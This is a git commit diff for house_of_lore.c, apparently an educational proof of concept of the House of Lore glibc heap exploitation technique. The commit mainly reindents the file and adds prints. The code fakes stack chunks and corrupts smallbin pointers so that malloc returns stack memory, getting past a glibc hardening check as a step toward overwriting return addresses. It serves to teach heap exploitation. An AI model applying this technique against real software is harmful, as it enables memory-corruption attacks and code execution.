5269848c76bd6d6424f0d80318c43e9fb7ce610b
Chris Salls <salls@cs.ucsb.edu>
2016-03-01 17:25:50 -0800

    fix tabs and add more prints

--- house_of_lore.c
+++ house_of_lore.c
@@ -7,7 +7,7 @@ This PoC take care also of the glibc hardening of smallbin corruption.
 else
     {
       bck = victim->bk;
-	  if (__glibc_unlikely (bck->fd != victim)){
+    if (__glibc_unlikely (bck->fd != victim)){
 
                   errstr = "malloc(): smallbin double linked list corrupted";
                   goto errout;
@@ -30,22 +30,22 @@ else
 int main(int argc, char * argv[]){
 
 
-	intptr_t* stack_buffer_1[4] = {0};
-	intptr_t* stack_buffer_2[3] = {0};
+  intptr_t* stack_buffer_1[4] = {0};
+  intptr_t* stack_buffer_2[3] = {0};
 
-	printf("\nWelcome to the House of Lore\n");
-	printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
-	printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
+  printf("\nWelcome to the House of Lore\n");
+  printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
+  printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
 
-	printf("Allocating the victim chunk\n");
-	intptr_t *victim = malloc(100);
-	printf("Allocated the first small chunk on the heap at %p\n", victim);
+  printf("Allocating the victim chunk\n");
+  intptr_t *victim = malloc(100);
+  printf("Allocated the first small chunk on the heap at %p\n", victim);
 
   // victim-8 because we need to remove the header size in order to have the absolute address of the chunk
-	intptr_t *victim_chunk = victim-2;
+  intptr_t *victim_chunk = victim-2;
 
-	printf("stack_buffer_1 at %p\n", (void*)stack_buffer_1);
-	printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);
+  printf("stack_buffer_1 at %p\n", (void*)stack_buffer_1);
+  printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);
 
   printf("Create a fake chunk on the stack");
   printf("Set the fwd pointer to the victim_chunk and the bk pointer to stack_buffer_2");
@@ -54,53 +54,56 @@ int main(int argc, char * argv[]){
   stack_buffer_1[2] = victim_chunk;
   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
 
-  //stack_buffer_2[0] = (intptr_t*)stack_buffer_1;
-  //stack_buffer_2[1] = (intptr_t*)stack_buffer_1;
   printf("stack_buffer_2 needs its fwd pointer to point to stack_buffer_1\n");
   printf("this will let us bypass the bck = victim->bk check\n");
   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
-	
-	printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
+  
+  printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
          "the small one during the free()\n");
-	void *p5 = malloc(1000);
-	printf("Allocated the large chunk on the heap at %p\n", p5);
+  void *p5 = malloc(1000);
+  printf("Allocated the large chunk on the heap at %p\n", p5);
 
 
-	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
-	free((void*)victim);
+  printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
+  free((void*)victim);
 
-	
-	printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
-	printf("This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
+  printf("\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
+  printf("victim->fwd: %p\n", (void *)victim[0]);
+  printf("victim->bk: %p\n\n", (void *)victim[1]);
 
-	void *p2 = malloc(1200);
-	printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
+  printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
+  printf("This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
 
-	//------------VULNERABILITY-----------
+  void *p2 = malloc(1200);
+  printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
 
-	printf("Now emulating a vulnerability that can overwrite the victim->fd and victim->bk pointers\n");
+  printf("The victim chunk has been sorted and its fwd and bk pointers updated\n");
+  printf("victim->fwd: %p\n", (void *)victim[0]);
+  printf("victim->bk: %p\n\n", (void *)victim[1]);
+
+  //------------VULNERABILITY-----------
+
+  printf("Now emulating a vulnerability that can overwrite the victim->fd and victim->bk pointers\n");
 
   victim[0] = (intptr_t)victim_chunk; //victim->fd point to victim in order to pass the check of small bin corrupted
   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
 
-	//------------------------------------
+  //------------------------------------
 
-	printf("Now allocating a chunk with size equal to the first one freed\n");
-	printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
+  printf("Now allocating a chunk with size equal to the first one freed\n");
+  printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
 
-	void *p3 = malloc(100);
+  void *p3 = malloc(100);
 
 
-	printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
-	char *p4 = malloc(100);
-
+  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
+  char *p4 = malloc(100);
+  printf("p4 = malloc(100)\n");
 
   printf("\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
          stack_buffer_2[2]);
 
-	printf("\np4 is %p and should be on the stack\n", p4); // this chunk will be allocated on stack
-
-	printf("\nNow everything that copy stuff into the allocated chunk on stack (p4) can be a used as a stack buffer overflow\nand have the possibility to overwrite a saved return address.\n\n");
+  printf("\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
 }
 
 
